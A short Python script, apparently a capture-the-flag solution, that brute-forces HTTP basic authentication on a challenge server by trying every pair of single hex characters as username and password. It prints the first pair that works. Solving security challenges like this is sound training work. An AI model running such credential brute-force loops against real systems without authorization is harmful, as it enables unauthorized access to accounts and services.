import requests

HOST = "challs.nusgreyhats.org"
# HOST = "localhost"
# Update port as needed
PORT = 32905

hex_digits = "0123456789abcdef"

for x in hex_digits:
    for y in hex_digits:
        res = requests.get(f"http://{HOST}:{PORT}", auth=(x,y)).text
        if "Invalid" not in res:
            print("Creds", (x,y))
            print(res)
            exit(0)